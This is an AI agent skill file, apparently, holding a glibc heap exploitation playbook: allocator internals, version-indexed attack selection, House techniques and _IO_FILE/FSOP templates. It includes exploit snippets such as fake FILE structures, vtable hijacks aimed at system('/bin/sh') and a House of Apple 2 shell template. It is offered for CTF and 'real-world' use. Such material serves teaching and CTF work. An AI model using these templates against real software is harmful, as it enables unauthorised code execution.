---
name: pwn-heap
description: >-
  Heap exploitation complete playbook. Covers ptmalloc2 internals, tcache/fastbin/unsortedbin/largebin attacks, House of techniques (Force/Orange/Spirit/Lore/Cat/Apple/Emma), _IO_FILE exploitation (FSOP/vtable hijack/stdout leak/wide_data chains), and glibc version-specific constraints (safe-linking 2.32+, vtable check 2.24+, setcontext RDX 2.29+). Load for CTF heap pwn or real-world glibc exploitation.
---

<!-- src: hacker/.claude/skills/pwn-heap/SKILL.md -->

# Heap Exploitation — Complete Playbook

> Expert glibc heap exploitation techniques. Covers ptmalloc2 internals, bin structures, tcache mechanics, libc/heap leak methods, attack selection by glibc version, named House techniques, _IO_FILE abuse (FSOP/vtable hijack/stdout leak/wide_data chains), and modern post-2.34 exploitation paths.

---

## Internal Navigation

| Section | Content |
|---|---|
| [1. Ptmalloc2 Structure Quick Reference](#1-ptmalloc2-structure-quick-reference) | Chunk layout, bin types, global structures |
| [2. Leak Methods](#2-leak-methods) | Libc base leak, heap base leak, safe-linking decode |
| [3. Attack Categories by Glibc Version](#3-attack-categories-by-glibc-version) | Version-indexed attack feasibility |
| [4. Common Vulnerability Patterns](#4-common-vulnerability-patterns) | UAF, double free, overflow, off-by-one |
| [5. Tools](#5-tools) | pwndbg, how2heap, pwntools |
| [6. Core Decision Tree](#6-core-decision-tree) | Primitive → attack path selection |
| [7. House of Force](#7-house-of-force) | Top chunk overwrite → arbitrary allocation |
| [8. House of Spirit](#8-house-of-spirit) | Fake chunk header → allocation at target |
| [9. House of Lore](#9-house-of-lore) | Smallbin corruption → arbitrary allocation |
| [10. House of Orange](#10-house-of-orange) | No free needed → shell via _IO_FILE |
| [11. House of Einherjar](#11-house-of-einherjar) | Off-by-null → backward consolidation |
| [12. House of Roman](#12-house-of-roman) | Partial overwrite, no leak needed |
| [13. House of Pig](#13-house-of-pig) | Largebin + _IO_FILE + tcache stashing |
| [14. House of Banana](#14-house-of-banana) | _rtld_global corruption via exit |
| [15. House of Cat](#15-house-of-cat) | _IO_wfile_jumps exploitation |
| [16. House of Apple (1, 2, 3)](#16-house-of-apple-1-2-3) | Largebin + wide-data chains |
| [17. Tcache-Specific Attacks](#17-tcache-specific-attacks) | Poisoning, key bypass, Botcake, stashing unlink |
| [18. Technique Selection Matrix](#18-technique-selection-matrix) | Glibc version → best approach |
| [19. _IO_FILE Structure Layout](#19-_io_file-structure-layout) | Full struct offsets |
| [20. FSOP — FILE Stream Oriented Programming](#20-fsop--file-stream-oriented-programming) | Trigger conditions, fake FILE template |
| [21. Vtable Hijack](#21-vtable-hijack) | Pre/post 2.24 strategies |
| [22. _IO_str_jumps Exploitation](#22-_io_str_jumps-exploitation) | glibc 2.24–2.27 gadget |
| [23. Stdout Arbitrary Read (Libc Leak)](#23-stdout-arbitrary-read-libc-leak) | Corrupt stdout for memory leak |
| [24. Stdin Arbitrary Write](#24-stdin-arbitrary-write) | Corrupt stdin for arbitrary write |
| [25. _IO_FILE in exit() Flow](#25-_io_file-in-exit-flow) | Exit path exploitation, pointer mangling |
| [26. FSOP + House of Apple 2 Template](#26-fsop--house-of-apple-2-template) | Modern glibc ≥ 2.34 full exploit |
| [27. _IO_FILE Decision Tree](#27-_io_file-decision-tree) | Goal → technique selection |

---

## Related Routing

- [stack-overflow-and-rop](../stack-overflow-and-rop/SKILL.md) — when the overflow is on the stack rather than the heap
- [format-string-exploitation](../format-string-exploitation/SKILL.md) — leak heap/libc addresses via format string
- [arbitrary-write-to-rce](../arbitrary-write-to-rce/SKILL.md) — convert heap arbitrary write into code execution
- [binary-protection-bypass](../binary-protection-bypass/SKILL.md) — bypass ASLR/RELRO to use heap write effectively

---

## 1. PTMALLOC2 STRUCTURE QUICK REFERENCE

### malloc_chunk Layout (64-bit)

```
         chunk pointer (returned by malloc - 0x10)
         ┌──────────────────────────┐
    0x00 │  prev_size (if prev free)│
    0x08 │  size        | A | M | P │  ← P=PREV_INUSE, M=IS_MMAPPED, A=NON_MAIN_ARENA
         ├──────────────────────────┤  ← user data starts here (returned pointer)
    0x10 │  fd (if free)            │  ← forward pointer to next free chunk
    0x18 │  bk (if free)            │  ← backward pointer to prev free chunk
    0x20 │  fd_nextsize (large only)│
    0x28 │  bk_nextsize (large only)│
         └──────────────────────────┘
```

### Bin Types

| Bin | Size Range (64-bit) | Structure | LIFO/FIFO |
|---|---|---|---|
| tcache (per-thread) | ≤ 0x410 (7 entries per size) | Singly linked (next pointer) | LIFO |
| fastbin | ≤ 0x80 (default) | Singly linked (fd) | LIFO |
| unsortedbin | Any freed size | Doubly linked circular | FIFO |
| smallbin | < 0x400 | Doubly linked circular | FIFO |
| largebin | ≥ 0x400 | Doubly linked + size-sorted | Sorted |

### Key Global Structures

| Structure | Location | Purpose |
|---|---|---|
| `main_arena` | libc .data segment | Contains bin heads, top chunk, system_mem |
| `mp_` | libc .data | malloc parameters (tcache settings, mmap threshold) |
| `tcache_perthread_struct` | Heap (first allocation) | Per-thread tcache bins and counts |

---

## 2. LEAK METHODS

### Libc Base Leak

| Method | Precondition | Technique |
|---|---|---|
| Unsortedbin fd/bk | Free a chunk > tcache range (or fill tcache) | fd/bk → `main_arena + 0x60` (or +0x70 depending on version) → libc base |
| Smallbin fd/bk | Chunk moved from unsortedbin to smallbin | Same as unsortedbin leak |
| stdout FILE leak | Write to `_IO_2_1_stdout_` | Corrupt `_IO_write_base` to leak libc data (see Section 23) |

### Heap Base Leak

| Method | Precondition | Technique |
|---|---|---|
| Tcache fd pointer | Free two tcache chunks, read first's fd | fd → heap address (XOR'd in ≥ 2.32) |
| Fastbin fd | Free two fastbin chunks | fd → heap address |
| UAF read | Use-after-free on freed chunk | Read fd/bk directly |

### Safe-Linking Decode (glibc ≥ 2.32)

```python
# PROTECT_PTR: fd_stored = (chunk_addr >> 12) ^ real_fd
# To decode: real_fd = fd_stored ^ (chunk_addr >> 12)
# To encode: fd_stored = (chunk_addr >> 12) ^ target_addr

def deobfuscate(stored_fd, chunk_addr):
    return stored_fd ^ (chunk_addr >> 12)

def obfuscate(target, chunk_addr):
    return (chunk_addr >> 12) ^ target
```

---

## 3. ATTACK CATEGORIES BY GLIBC VERSION

### glibc < 2.26 (No tcache)

| Attack | Primitive Needed | Result |
|---|---|---|
| Fastbin dup | Double free | Arbitrary allocation |
| Unsortedbin attack | Corrupt unsortedbin bk | Write `main_arena` addr to target (used for __malloc_hook nearby overwrite) |
| Unlink attack | Heap overflow into prev_size + fd/bk | Arbitrary write (with known heap pointer) |
| House of Force | Top chunk size overwrite | Arbitrary allocation |
| House of Spirit | Write fake chunk header | Fastbin allocation at fake chunk |
| Off-by-one null | Null byte overflow into next chunk size | Overlapping chunks |

### glibc 2.26–2.28 (tcache, no key)

| Attack | Notes |
|---|---|
| Tcache poisoning | Overwrite tcache fd → arbitrary allocation, no size check |
| Tcache dup | Double free into tcache (no double-free detection yet) |
| All previous attacks | Still work, but chunks go to tcache first |

### glibc 2.29–2.31 (tcache key introduced)

| Attack | Bypass for tcache key |
|---|---|
| Tcache dup | Corrupt `key` field (at chunk+0x18) before second free |
| House of Botcake | Double free: one in unsortedbin, one in tcache → overlapping |
| Tcache stashing unlink | Abuse smallbin→tcache refill to get arbitrary chunk |

### glibc 2.32–2.33 (safe-linking / PROTECT_PTR)

| Attack | Adaptation |
|---|---|
| Tcache poisoning | Encode target with `(chunk_addr >> 12) ^ target` |
| Heap leak required | Need heap addr to decode/encode safe-linked pointers |
| Fastbin dup | Same encoding required |

### glibc ≥ 2.34 (hooks removed)

| Change | Impact |
|---|---|
| `__malloc_hook` removed | Cannot overwrite hook for one_gadget |
| `__free_hook` removed | Cannot overwrite hook |
| `__realloc_hook` removed | Cannot use realloc trick for one_gadget constraints |

**Post-2.34 targets**: `_IO_FILE`, `exit_funcs`, `TLS_dtor_list`, `_dl_fini` (see Sections 19–27).

---

## 4. COMMON VULNERABILITY PATTERNS

| Vulnerability | Description | Exploitation Path |
|---|---|---|
| UAF (Use-After-Free) | Access chunk after free | Read: leak fd/bk; Write: corrupt fd for tcache poisoning |
| Double Free | free() same chunk twice | Tcache dup (bypass key) or fastbin dup |
| Heap Overflow | Write past chunk boundary | Corrupt next chunk's metadata (size, fd, bk) |
| Off-by-one | One byte overflow | Null byte → shrink next chunk size → overlapping chunks |
| Off-by-null | Specifically `\x00` overflow | Clear PREV_INUSE → trigger backward consolidation |
| Uninitialized read | Read heap memory without clearing | Leak fd/bk from recycled chunk |

---

## 5. TOOLS

```bash
# pwndbg heap inspection
pwndbg> heap                      # display all chunks
pwndbg> bins                      # show all bin contents
pwndbg> tcachebins                # tcache status
pwndbg> fastbins                  # fastbin status
pwndbg> unsortedbin               # unsortedbin content
pwndbg> vis_heap_chunks           # visual heap layout
pwndbg> find_fake_fast &__malloc_hook  # find nearby fake fastbin chunks

# how2heap — reference implementations
git clone https://github.com/shellphish/how2heap

# heapinspect
pip install heapinspect
heapinspect <pid>

# pwntools helpers
from pwn import *
libc = ELF('./libc.so.6')
print(hex(libc.symbols['__malloc_hook']))
print(hex(libc.symbols['__free_hook']))
```

---

## 6. CORE DECISION TREE

```
Heap vulnerability identified
├── What is the primitive?
│   ├── UAF (read + write)
│   │   ├── Can read freed chunk? → Leak libc (unsortedbin) or heap (tcache fd)
│   │   └── Can write freed chunk? → Tcache poisoning / fastbin dup
│   ├── Double free
│   │   ├── glibc < 2.29 → direct tcache dup
│   │   ├── glibc 2.29-2.31 → corrupt tcache key first, or House of Botcake
│   │   └── glibc ≥ 2.32 → need heap leak for safe-linking encode
│   ├── Heap overflow (controlled size)
│   │   ├── Overwrite next chunk size → overlapping chunks → UAF
│   │   └── Overwrite fd directly → arbitrary allocation
│   ├── Off-by-one / off-by-null
│   │   ├── Null byte into size → House of Einherjar (backward consolidation)
│   │   └── One byte into size → shrink chunk, create overlap
│   └── Arbitrary write (from overlap or poisoned allocation)
│       ├── glibc < 2.34 → __malloc_hook / __free_hook → one_gadget
│       ├── glibc ≥ 2.34 → _IO_FILE vtable, exit_funcs, TLS_dtor_list
│       └── Partial RELRO → GOT overwrite
│
├── Need libc leak?
│   ├── Free chunk into unsortedbin (size > 0x410 or fill 7 tcache)
│   ├── Read fd/bk → main_arena offset → libc base
│   └── Alternative: stdout FILE partial overwrite for leak
│
└── Need heap leak? (glibc ≥ 2.32)
    ├── Read tcache fd from freed chunk
    └── Decode: real_addr = stored_fd ^ (chunk_addr >> 12)
```

---

## 7. HOUSE OF FORCE

**Overwrite top chunk size → control next allocation address.**

| Aspect | Detail |
|---|---|
| Primitive needed | Overflow into top chunk size field |
| Glibc constraint | < 2.29 (2.29 adds top chunk size validation) |
| Mechanism | Set top chunk size to `0xffffffffffffffff`, then request `target_addr - top_addr - 0x20` bytes → next malloc returns near target |

```python
# Overwrite top chunk size to -1
edit(top_adjacent_chunk, b'A' * data_size + p64(0) + p64(0xffffffffffffffff))
# Calculate evil size
evil_size = target_addr - (top_chunk_addr + 0x10) - 0x10
malloc(evil_size)          # consume top chunk up to target
ptr = malloc(0x10)         # this allocation lands at target_addr
```

---

## 8. HOUSE OF SPIRIT

**Forge a fake chunk header → free it → allocate at fake location.**

| Aspect | Detail |
|---|---|
| Primitive needed | Write at least 16 bytes at target (fake chunk header) |
| Target | Get fastbin/tcache allocation at stack/BSS/anywhere |
| Mechanism | Craft fake `size` field (matching fastbin/tcache range), ensure next chunk's size is valid, free the fake chunk |

```python
# Stack layout: forge fake chunk
fake_chunk = target_addr - 0x10
# At fake_chunk+0x8: size = 0x41 (fastbin 0x40)
# At fake_chunk+0x48: next_chunk_size = 0x21 (valid, > 0x10, < av->system_mem)
free(fake_chunk + 0x10)    # free the "user data" pointer
ptr = malloc(0x30)         # returns fake_chunk + 0x10 = target_addr
```

**tcache variant (glibc ≥ 2.26)**: No next-chunk size validation needed. Only need valid `size` field matching tcache bin index.

---

## 9. HOUSE OF LORE

**Forge fake smallbin chunk → get allocation at arbitrary address.**

| Aspect | Detail |
|---|---|
| Primitive needed | Heap write to corrupt smallbin bk pointer |
| Mechanism | Insert fake chunk into smallbin via bk corruption → `malloc` returns fake chunk |
| Checks to satisfy | `victim->bk->fd == victim` (doubly linked list integrity) |

Requires crafting a fake chunk where `fake->fd = smallbin_head` to pass the check.

---

## 10. HOUSE OF ORANGE

**No `free()` needed → get shell via _IO_FILE.**

| Aspect | Detail |
|---|---|
| Primitive needed | Heap overflow to corrupt top chunk size |
| Glibc constraint | Works on 2.23; vtable check added in 2.24 (needs bypass); fully blocked in later versions without _IO_str_jumps trick |
| Mechanism | Shrink top chunk size → next large malloc triggers `sysmalloc` → old top freed into unsortedbin → unsortedbin attack writes `_IO_list_all` → trigger `_IO_flush_all_lockp` via abort/exit |

### Attack Flow

1. Overflow: corrupt top chunk size to small valid value (page-aligned, PREV_INUSE set)
2. Large malloc: triggers `sysmalloc`, old top chunk freed into unsortedbin
3. Unsortedbin attack: corrupt unsortedbin chunk's bk to `_IO_list_all - 0x10`
4. Next malloc (smallbin size): unsortedbin → smallbin sorting writes `main_arena+0x68` to `_IO_list_all`
5. `_IO_list_all` now points to `main_arena+0x68`, which overlaps with smallbin[5]
6. Forge fake _IO_FILE at that smallbin entry with vtable pointing to controlled memory
7. Trigger: malloc error → `_IO_flush_all_lockp` → calls `_IO_OVERFLOW` on fake FILE → shell

---

## 11. HOUSE OF EINHERJAR

**Off-by-null byte → backward consolidation → overlapping chunks.**

| Aspect | Detail |
|---|---|
| Primitive needed | Null byte overflow (off-by-one with `\x00`) |
| Mechanism | Clear PREV_INUSE bit of next chunk → set fake `prev_size` → `free` triggers backward consolidation with a fake previous chunk |

### Steps

1. Allocate A, B, C (B is the overflow target)
2. Overflow from A: null byte into B's size field → clears PREV_INUSE of B
3. Forge `prev_size` in B to point back to a fake/controlled chunk
4. Free B: backward consolidation merges B with the "previous" chunk → overlapping region
5. Allocate into the overlapping region → control C's metadata

**glibc ≥ 2.29**: Added `prev_size == chunk_size(prev)` check → need to ensure fake prev chunk has matching size.

---

## 12. HOUSE OF ROMAN

**Partial overwrite without any leak → get shell.**

| Aspect | Detail |
|---|---|
| Primitive needed | UAF + fastbin dup or heap overflow |
| Special | Works without libc or heap leak (12-bit brute-force = 1/4096) |
| Mechanism | Partial overwrite fastbin fd to point near `__malloc_hook`, overwrite hook with one_gadget via partial overwrite |

Combines three partial overwrites:
1. Fastbin fd → near `__malloc_hook` (partial overwrite)
2. Unsortedbin attack → write near `__malloc_hook` area
3. Overwrite `__malloc_hook` with one_gadget (partial overwrite, 4-bit guess)

Success rate: ~1/4096 per attempt.

---

## 13. HOUSE OF PIG

**Largebin attack + _IO_FILE + tcache stashing unlink.**

| Aspect | Detail |
|---|---|
| Glibc target | 2.31+ (post-tcache key) |
| Mechanism | Largebin attack writes heap address to `_IO_list_all`, forge _IO_FILE to call `_IO_str_overflow` which triggers `malloc` → tcache stashing unlink for arbitrary write → overwrite `__free_hook` |

---

## 14. HOUSE OF BANANA

**Manipulate `_rtld_global` (ld.so) for code execution during exit.**

| Aspect | Detail |
|---|---|
| Target | `_rtld_global._dl_ns[0]._ns_loaded->l_next->...->l_info[DT_FINI_ARRAY]` |
| Mechanism | Corrupt link_map chain → during `_dl_fini` (called by exit), fake `DT_FINI_ARRAY` entries are called |
| Advantage | Bypasses `_IO_FILE` vtable range checks |

---

## 15. HOUSE OF CAT

**`_IO_wfile_jumps` exploitation.**

| Aspect | Detail |
|---|---|
| Glibc target | ≥ 2.35 (bypasses vtable range check via wide-char vtable) |
| Mechanism | `_IO_wfile_seekoff` → `_IO_switch_to_wget_mode` → calls through `_wide_data->_wide_vtable->_IO_wfile_overflow` |
| Key | Forge `_wide_data` structure with controlled `_wide_vtable` pointing outside the vtable range check |

### Constraints for Trigger

```c
// Must satisfy:
fp->_mode > 0          // or fp->_IO_write_ptr > fp->_IO_write_base
fp->_wide_data != NULL
fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base
```

---

## 16. HOUSE OF APPLE (1, 2, 3)

### House of Apple 1: stdout Leak

Corrupt `_IO_2_1_stdout_` via largebin attack → arbitrary memory leak.

### House of Apple 2: _IO_wfile_jumps Chain

| Step | Action |
|---|---|
| 1 | Largebin attack: write heap addr to `_IO_list_all` (or stderr/stdout pointer) |
| 2 | Forge `_IO_FILE` with `_wide_data` pointing to controlled area |
| 3 | Set `_wide_data->_wide_vtable` to `_IO_wfile_jumps - 0x20` (or similar offset) |
| 4 | Trigger `_IO_flush_all_lockp` (exit/abort) → `_IO_wfile_overflow` → controlled call |

### House of Apple 3: _IO_wstrn_jumps

Uses `_IO_wstrn_overflow` to achieve arbitrary write during FILE flush, then chains to `_IO_wfile_jumps` for RCE.

---

## 17. TCACHE-SPECIFIC ATTACKS

### Tcache Poisoning

```python
# Direct fd overwrite (glibc < 2.32)
free(A)               # A enters tcache
edit(A, p64(target))  # overwrite A->fd = target
malloc(size)          # returns A
malloc(size)          # returns target

# Safe-linking version (glibc >= 2.32)
free(A)
edit(A, p64((heap_base >> 12) ^ target))  # encode with PROTECT_PTR
```

### Tcache Key Bypass (glibc 2.29+)

```python
# tcache key stored at chunk+0x18 (in user data area after fd)
free(A)
edit(A, p64(0) + p64(0))  # clear fd and key
free(A)                     # double free succeeds (key != tcache_perthread)
```

### House of Botcake

```python
# Double free: one copy in unsortedbin, one in tcache
fill_tcache(7)         # fill tcache bin
free(A)                # A → unsortedbin
free(B)                # B → unsortedbin (B adjacent to A, consolidates)
drain_tcache(1)        # make room in tcache
free(A)                # A → tcache (A is now in both unsortedbin-merged-chunk and tcache)
# Overlapping: allocate from unsortedbin → overlaps A in tcache → control A's fd
```

### Tcache Stashing Unlink

When smallbin has chunks and tcache has room, `malloc` from smallbin triggers refill: remaining smallbin chunks are moved to tcache. By corrupting smallbin `bk`, this refill writes controlled addresses into tcache.

---

## 18. TECHNIQUE SELECTION MATRIX

| glibc | No Free | No Leak | Hooks Available | Best Approach |
|---|---|---|---|---|
| < 2.26 | House of Orange | House of Roman | Yes | Orange → unsortedbin attack → __malloc_hook |
| 2.26–2.28 | House of Orange variant | House of Roman | Yes | Tcache poisoning + hook overwrite |
| 2.29–2.31 | Needs adaptation | Botcake / Roman | Yes | Botcake → hook or IO_FILE |
| 2.32–2.33 | Needs adaptation | Needs heap leak | Yes | Safe-linking aware tcache poison |
| ≥ 2.34 | House of Apple/Cat | Needs heap+libc leak | **No** | Largebin attack + House of Apple 2/Cat |
| ≥ 2.35 | House of Cat | Needs both leaks | **No** | House of Cat (_IO_wfile_jumps) |

---

## 19. _IO_FILE STRUCTURE LAYOUT (64-bit)

```c
struct _IO_FILE_plus {
    _IO_FILE file;           // 0x0 - 0xc0
    const struct _IO_jump_t *vtable;  // 0xd8
};

// Key fields at specific offsets:
// 0x00: _flags
// 0x08: _IO_read_ptr
// 0x10: _IO_read_end
// 0x18: _IO_read_base
// 0x20: _IO_write_base    ← for stdout leak: set this to target
// 0x28: _IO_write_ptr     ← must be > _IO_write_base
// 0x30: _IO_write_end
// 0x38: _IO_buf_base
// 0x40: _IO_buf_end
// 0x68: _chain            ← linked list to next FILE
// 0x70: _fileno           ← file descriptor number
// 0x88: _lock             ← must point to valid (writable NULL) lock
// 0xc0: _mode             ← 0 for byte mode, >0 for wide
// 0xd8: vtable            ← _IO_jump_t pointer
```

---

## 20. FSOP — FILE STREAM ORIENTED PROGRAMMING

**Overwrite `_IO_list_all` to insert a fake _IO_FILE, trigger flush → controlled vtable call.**

### Trigger Conditions

`_IO_flush_all_lockp` is called automatically during:
1. `exit()` → `__run_exit_handlers` → `_IO_cleanup` → `_IO_flush_all_lockp`
2. `abort()` (triggered by malloc corruption detection)
3. Return from `main()`

### Flush Condition per FILE

```c
if ((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
    || (fp->_mode > 0 && fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base))
{
    _IO_OVERFLOW(fp, EOF);  // calls vtable->__overflow
}
```

### Fake FILE Template

```python
fake_file = b''
fake_file += p64(0)                    # _flags: set to pass checks
fake_file += p64(0) * 3               # _IO_read_ptr/end/base
fake_file += p64(0)                    # _IO_write_base = 0
fake_file += p64(1)                    # _IO_write_ptr = 1 (> write_base)
fake_file += p64(0) * 2               # _IO_write_end, _IO_buf_base
fake_file += p64(0)                    # _IO_buf_end
fake_file += p64(0) * 4               # _IO_save_base to _IO_backup_base
fake_file += p64(0)                    # _IO_save_end
fake_file += p64(0)                    # _markers
fake_file += p64(0)                    # _chain
fake_file += p32(0) + p32(0)          # _fileno + _flags2
fake_file += p64(0)                    # _old_offset
fake_file += p64(0)                    # _cur_column + _vtable_offset + _shortbuf
fake_file += p64(lock_addr)           # _lock (must be valid writable addr with NULL)
fake_file = fake_file.ljust(0xc0, b'\x00')
fake_file += p64(0)                    # _mode = 0 (byte mode)
fake_file = fake_file.ljust(0xd8, b'\x00')
fake_file += p64(fake_vtable_addr)    # vtable pointer
```

---

## 21. VTABLE HIJACK

### Pre-glibc 2.24: Direct Vtable Overwrite

Forge a fake vtable at controlled address, set `__overflow` entry to target function (e.g., `system`).

```python
fake_vtable = p64(0) * 3              # padding (entries before __overflow)
fake_vtable += p64(system_addr)       # __overflow at vtable+0x18
# Set fp->vtable = &fake_vtable
# fp is first arg to __overflow, so fp starts with "/bin/sh\x00" → system("/bin/sh...")
```

### Post-glibc 2.24: Vtable Range Check

```c
// _IO_vtable_check: vtable must be within [__libc_IO_vtables, __libc_IO_vtables + size]
// If outside range → abort()
```

**Bypass strategies**:

| Method | glibc Range | Technique |
|---|---|---|
| `_IO_str_jumps` | 2.24–2.27 | Point vtable to `_IO_str_jumps` (within valid range), use `_IO_str_overflow` as gadget |
| `_IO_wfile_jumps` | ≥ 2.28 | Wide-char vtable indirection through `_wide_data->_wide_vtable` (no range check on wide vtable) |
| `_IO_wstr_jumps` | ≥ 2.28 | Similar to wfile, via wide-string operations |
| `_IO_cookie_jumps` | Specific versions | Cookie FILE has function pointers XOR'd with pointer guard |

---

## 22. _IO_str_jumps EXPLOITATION (glibc 2.24–2.27)

`_IO_str_overflow` calls `malloc` and `memcpy` based on FILE fields → can redirect to `system`.

```c
// Simplified _IO_str_overflow:
new_size = 2 * ((_IO_buf_end - _IO_buf_base) + 100);
new_buf = malloc(new_size);      // if we overwrite (fp+0xe0) = system, this calls system
```

Alternative: `_IO_str_finish` calls `fp->_s._free_buffer(fp->_IO_buf_base)`:

```python
# Set _IO_buf_base = "/bin/sh" address
# Set _s._free_buffer = system
# vtable = _IO_str_jumps (valid range)
# Trigger fclose/exit → _IO_str_finish → system("/bin/sh")
```

---

## 23. STDOUT ARBITRARY READ (LIBC LEAK)

Corrupt `_IO_2_1_stdout_` to leak arbitrary memory when the program calls `puts`/`printf`.

### Technique

```python
# Overwrite stdout fields:
_flags  = 0xfbad1800     # _IO_MAGIC | _IO_IS_FILEBUF | _IO_CURRENTLY_PUTTING
_IO_read_ptr = 0         # zeroed
_IO_read_end = 0         # zeroed
_IO_read_base = 0        # zeroed
_IO_write_base = target_addr   # ← start of leak
_IO_write_ptr = target_addr + leak_size  # ← end of leak
# Next puts/printf outputs bytes from [write_base, write_ptr)
```

### Partial Overwrite Variant (No Full Libc Leak Yet)

Overwrite only the last 2 bytes of `_IO_write_base` (e.g., `\x00\x00`) to leak from a nearby lower address → often leaks libc addresses from the FILE structure itself.

```python
# stdout is at libc+offset, only last 1.5 bytes differ from heap chunk
# Partial overwrite of _IO_write_base's last byte to \x00 → leaks backward
```

---

## 24. STDIN ARBITRARY WRITE

Corrupt `_IO_2_1_stdin_` to make `scanf`/`fgets`/`getchar` write to arbitrary memory.

```python
# Set stdin fields:
_IO_buf_base = target_write_addr
_IO_buf_end = target_write_addr + write_size
_IO_read_ptr = target_write_addr    # equal to _IO_read_end to trigger refill
_IO_read_end = target_write_addr
# Next scanf/fgets reads user input into [buf_base, buf_end)
```

---

## 25. _IO_FILE IN EXIT() FLOW

### Execution Path in exit()

```
exit()
  → __run_exit_handlers()
    → _IO_cleanup()
      → _IO_flush_all_lockp()     ← iterates _IO_list_all
        → _IO_OVERFLOW(fp, EOF)   ← for each FILE meeting flush condition
```

### Modern Targets in __run_exit_handlers (glibc ≥ 2.34)

| Target | Location | Mechanism |
|---|---|---|
| `__exit_funcs` | libc .data | Linked list of function pointers called during exit |
| `_IO_list_all` | libc .data | FSOP via _IO_flush_all_lockp |
| `tls_dtor_list` | TLS (thread-local) | Destructor list, XOR'd with `__pointer_chk_guard` |
| `_dl_fini` | ld.so | Calls DT_FINI_ARRAY entries from link_map |

### __exit_funcs Pointer Mangling

```c
// Function pointers in exit_funcs are mangled:
// stored = (ptr >> 0x11 | ptr << (64-0x11)) ^ __pointer_chk_guard
// To forge: need to know/leak __pointer_chk_guard (at fs:[0x30])
```

---

## 26. FSOP + HOUSE OF APPLE 2 TEMPLATE (glibc ≥ 2.34)

```python
# 1. Achieve arbitrary write via largebin attack or other primitive
# 2. Write heap address to _IO_list_all (or corrupt stderr->_chain)
# 3. At heap address, forge _IO_FILE:

fake = FileStructure()
fake._flags = 0             # or specific value to pass checks
fake._IO_write_ptr = 1      # > _IO_write_base (=0) to trigger flush
fake._mode = 1              # > 0 → use wide path
fake._lock = heap_addr + 0x100  # valid lock (writable, contains 0)
fake._wide_data = heap_addr + 0x200  # points to controlled wide_data

# At heap_addr + 0x200: forge _IO_wide_data
wide_data = b'\x00' * 0x20
wide_data += p64(1)         # _IO_write_ptr = 1
wide_data = wide_data.ljust(0xe0, b'\x00')
wide_data += p64(heap_addr + 0x300)  # _wide_vtable → fake wide vtable

# At heap_addr + 0x300: forge wide vtable
# __overflow is at vtable + 0x18
wide_vtable = p64(0) * 3
wide_vtable += p64(magic_gadget)  # __overflow → setcontext+53 or system

# 4. Trigger exit() → shell
```

---

## 27. _IO_FILE DECISION TREE

```
Need _IO_FILE exploitation?
├── Goal: Leak memory without explicit output?
│   └── Corrupt stdout._IO_write_base → automatic leak on next I/O
├── Goal: Arbitrary write via I/O?
│   └── Corrupt stdin._IO_buf_base → next input writes to target
├── Goal: Code execution via FSOP?
│   ├── glibc < 2.24 → direct vtable overwrite
│   ├── glibc 2.24–2.27 → _IO_str_jumps or _IO_str_finish
│   ├── glibc 2.28–2.33 → _IO_wfile_jumps (wide-char path)
│   └── glibc ≥ 2.34 → House of Apple 2 / House of Cat
└── Trigger method?
    ├── exit() / return from main → _IO_flush_all_lockp
    ├── malloc abort (corruption) → _IO_flush_all_lockp
    └── Explicit fclose(fp) → _IO_FINISH via vtable
```
